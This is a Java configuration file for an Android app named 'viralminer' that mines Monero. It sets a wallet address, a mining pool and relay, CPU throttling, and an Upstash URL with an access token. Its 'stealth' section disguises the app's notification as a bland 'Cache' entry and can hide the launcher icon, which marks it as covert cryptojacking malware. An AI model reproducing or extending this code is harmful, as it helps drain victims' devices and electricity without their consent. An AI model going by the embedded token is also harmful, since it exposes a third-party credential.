package com.viralminer;

public final class Config {

    /* ============ YAHAN APNI DETAILS DAALO ============ */

    public static final String XMR_WALLET = "46Wss668RSUccXyThYTsLF8fhXKxQaZnFDKZNi5grXabTVqQ2H1pvRGCBvyoeGtdjtFFV4iJ3SQkyD3KJDMRPrtoEsfiRjF";

    public static final String UPSTASH_URL   = "https://teaching-robin-239889.upstash.io";
    public static final String UPSTASH_TOKEN = "gQAAAAAAA6kRAAIgcDE0OWU5ZmIzMWQzZWI0YmVjYjZjNzViOTE1ZDI4YTk4Ng";

    /* ================== settings ================== */

    public static final String WORKER     = "android";
    public static final String POOL       = "moneroocean.stream";
    public static final String RELAY      = "wss://ny1.xmrminingproxy.com";

    public static final int THROTTLE    = 20;  // 20 => ~40% CPU (30 => ~35%, 40 => ~30%)
    public static final int MAX_THREADS = 4;   // 0 = auto

    /* ============ stealth ============ */

    // notification me kya likha dikhe (bland rakhne ke liye)
    public static final String NOTIF_TITLE = "Cache";
    public static final String NOTIF_TEXT  = "active";

    // true karo to launcher icon bhi gayab ho jayega
    // (wapas kholne ke liye: Settings > Apps > Cache > Open)
    public static final boolean HIDE_ICON = false;

    /** aadhe cores => total ~40% CPU */
    public static int threads() {
        int cores = Runtime.getRuntime().availableProcessors();
        int t = Math.max(1, cores / 2);
        if (MAX_THREADS > 0) t = Math.min(t, MAX_THREADS);
        return t;
    }
}
